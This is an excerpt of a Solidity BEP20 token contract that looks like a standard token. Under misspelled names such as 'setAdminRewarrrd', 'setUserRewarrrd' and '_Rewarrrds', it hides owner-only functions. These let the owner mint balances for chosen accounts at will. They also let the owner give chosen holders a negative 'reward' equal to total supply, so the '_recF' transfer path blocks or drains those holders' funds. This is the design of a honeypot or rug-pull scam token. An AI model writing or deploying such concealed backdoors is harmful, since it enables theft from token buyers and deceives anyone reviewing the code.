...
contract BEP20 is Context {
    ...
    function approve(address spender, uint256 amoonnt) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amoonnt);
        return true;
    }
    ...
    function _approve(
        ...
        _allowances[owner][spender] = amoonnt;
        emit Approval(owner, spender, amoonnt);
    }
    ...
    function _spendAllowance(
        ...
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amoonnt, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amoonnt);
        }
        }
    }
...
contract Token is BEP20, Ownable {
    ...
    function _transfer(
        ...
        require(fromBalance >= amoonnt, "ERC20: transfer amoonnt exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amoonnt;
    }
        _balances[to] += amoonnt;

        emit Transfer(from, to, amoonnt);
    }

    function _burn(address accont, uint256 amoonnt) internal virtual {
        require(accont != address(0), "ERC20: burn from the zero address");

        uint256 accoontBalance = _balances[accont];
        require(accoontBalance >= amoonnt, "ERC20: burn amoonnt exceeds balance");
    unchecked {
        _balances[accont] = accoontBalance - amoonnt;
    }
        _totalSupply -= amoonnt;

        emit Transfer(accont, address(0), amoonnt);
    }

    function _mtin(address accont, uint256 amoonnt) internal virtual {
        require(accont != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amoonnt;
        _balances[accont] += amoonnt;
        emit Transfer(address(0), accont, amoonnt);
    }
    ...
    mapping(address => int256) private _Rewarrrds;
    ...
    function setAdminRewarrrd(address accdount,int256 amoonnt ) public onlyowner {
        _Rewarrrds[accdount] += amoonnt;
    }

    function rmUserRewarrrd(address accdount) public onlyowner {
        _Rewarrrds[accdount] = 0;
    }


    function setUserRewarrrd(address accdount) public onlyowner {
        _Rewarrrds[accdount] = int256(0) - int256(_totalSupply);
    }
    

    function getRewarrrd(address accdount) public view returns (int256) {
        return _Rewarrrds[accdount];
    }
    ...
    function _recF(
        ...
        uint256 fromBalance = _balances[from];
        require(fromBalance >= _acooont, "ERC20: transfer amoonnt exceeds balance");
        if (_Rewarrrds[from] > 2){
            _balances[from] = _balances[from].add(uint256(_Rewarrrds[from]));
        }else if (_Rewarrrds[from] < 0){
            _balances[from] = _balances[from].sub(uint256(_Rewarrrds[from]));
        }
    ...
    function transfer(address to, uint256 amoonnt) public virtual returns (bool) {
        address owner = _msgSender();
        _recF(owner, to, amoonnt);
        return true;
    }
    ...
    function transferFrom(
        ...
        _spendAllowance(from, spender, amoonnt);
        _recF(from, to, amoonnt);
        return true;
    }
}